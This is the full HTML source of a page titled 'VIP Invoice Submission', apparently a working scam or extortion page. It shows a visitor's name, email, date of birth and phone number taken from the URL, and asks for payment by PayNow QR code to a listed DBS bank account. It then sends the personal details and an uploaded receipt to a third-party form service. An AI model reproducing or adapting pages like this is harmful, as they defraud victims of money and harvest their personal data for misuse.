
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VIP Invoice Submission | Singapore Scammers</title>
  <meta name="description" content="Submit your VIP subscription invoice securely. Fast, easy, and protected with SingaporeScammers.com.">
  <meta name="keywords" content="VIP subscription, invoice submission, Singapore scammers, VIP membership payment, PayNow invoice">
  <meta name="author" content="Singapore Authentic Scam Review">
  <link rel="canonical" href="https://www.singaporeblacklisted.site/complaint-invoice.html" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Poppins', sans-serif;
  }

  body {
    background: #000;
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    text-align: center;
    overflow-x: hidden;
    min-height: 100vh;
    padding: 10px;
  }

  .form-container {
    width: 100%;
    max-width: 750px;
    background: #111;
    padding: 25px 20px;
    border-radius: 10px;
    border: 2px solid red;
    box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
  }

  h1 {
    font-size: 26px;
    color: red;
    margin-bottom: 15px;
    text-shadow: 0 0 8px red;
    text-transform: uppercase;
  }

  table {
    width: 100%;
    margin-bottom: 20px;
    background: #222;
    border-collapse: collapse;
    border-radius: 8px;
    overflow: hidden;
  }

  th, td {
    padding: 12px;
    text-align: left;
    border-bottom: 1px solid #333;
  }

  th {
    background: #550000;
    color: #ff4d4d;
  }

  td {
    font-size: 14px;
  }

  .highlight {
    color: lime;
    font-weight: bold;
  }

  img.paynow {
    width: 100%;
    max-width: 260px;
    margin: 15px auto;
    border-radius: 8px;
    display: block;
  }

  .download-btn {
    background: red;
    padding: 12px 20px;
    border-radius: 8px;
    color: white;
    font-weight: bold;
    display: inline-block;
    margin: 15px 0;
    text-decoration: none;
    font-size: 15px;
    transition: 0.3s;
  }

  .download-btn:hover {
    background: #ff3333;
    box-shadow: 0 0 8px red;
  }

  .payment-info p {
    margin: 5px 0;
    font-size: 15px;
  }

  input[type="file"] {
    background: #fff;
    color: #000;
    padding: 10px;
    font-size: 14px;
    border-radius: 8px;
    width: 100%;
    max-width: 400px;
    margin: 15px auto;
    display: block;
    border: none;
  }

  .submit-btn {
    display: block;
    width: 100%;
    padding: 14px 25px;
    margin-top: 20px;
    background: linear-gradient(90deg, #ff0000, #cc0000);
    border: none;
    border-radius: 8px;
    color: #fff;
    font-size: 18px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
    cursor: pointer;
    transition: 0.3s;
  }

  .submit-btn:active {
    transform: scale(0.97);
  }

  .submit-btn:hover {
    background: linear-gradient(90deg, #ff4d4d, #cc0000);
    box-shadow: 0 0 10px #ff3333;
  }

  @media (max-width: 768px) {
    body {
      padding: 15px;
    }

    .form-container {
      padding: 20px 15px;
    }

    h1 {
      font-size: 22px;
    }

    th, td {
      font-size: 13px;
    }

    .submit-btn {
      font-size: 16px;
    }
  }
</style>
</head>

<body>

<form action="https://formsubmit.co/report@singaporescammers.com" method="POST" enctype="multipart/form-data">

  <table>
    <tr><th>Description</th><th>Details</th></tr>
    <tr><td>Full Name</td><td id="displayName">Loading...</td></tr>
    <tr><td>Email Address</td><td id="displayEmail">Loading...</td></tr>
    <tr><td>Date of Birth</td><td id="displayDob">Loading...</td></tr>
    <tr><td>Phone Number</td><td id="displayPhone">Loading...</td></tr>
  </table>

  <h2 style="color:red; margin-top:30px;">PayNow QR Code</h2>
  <img id="qrCode" src="https://www.singaporeblacklisted.site/assets/PaynowQRCode.png" alt="PayNow QR" class="paynow">
  <a href="https://www.singaporeblacklisted.site/assets/PaynowQRCode.png" download="PayNow_QR_SingaporeScammer.png" class="download-btn">Save QR to Gallery</a>

  <div class="payment-info">
    <p><strong>Payee Name:</strong> Complaint Singapore Party</p>
    <p><strong>Bank Name:</strong> DBS BANK</p>
    <p><strong>Acc Num:</strong> 88532600023329155</p>
  </div>

  <div style="margin-top: 25px; text-align: left;">
    <label for="attachment" style="font-weight: bold; color: #ff4d4d;">Upload Receipt (Image or PDF):</label><br>
    <input type="file" name="attachment" id="attachment" accept="image/*,.pdf" required style="margin-top: 8px; padding: 6px; border-radius: 6px; border: none;">
  </div>

  <input type="hidden" name="_redirect" value="https://www.singaporeblacklisted.site/thank-you.html">
  <input type="hidden" name="_captcha" value="false">
  <input type="hidden" name="Full Name" id="inputFullName">
  <input type="hidden" name="Email Address" id="inputEmail">
  <input type="hidden" name="Date of Birth" id="inputDob">
  <input type="hidden" name="Phone Number" id="inputPhone">

  <button type="submit" class="submit-btn">Submit Receipt</button>
</form>

<script>
document.addEventListener("DOMContentLoaded", function () {
  const params = new URLSearchParams(window.location.search);
  document.getElementById("displayName").textContent = params.get("name") || "Not provided";
  document.getElementById("displayEmail").textContent = params.get("email") || "Not provided";
  document.getElementById("displayDob").textContent = params.get("dob") || "Not provided";
  document.getElementById("displayPhone").textContent = params.get("phone") || "Not provided";
  document.getElementById("inputFullName").value = params.get("name") || "";
  document.getElementById("inputEmail").value = params.get("email") || "";
  document.getElementById("inputDob").value = params.get("dob") || "";
  document.getElementById("inputPhone").value = params.get("phone") || "";
});
</script>

</body>
</html>
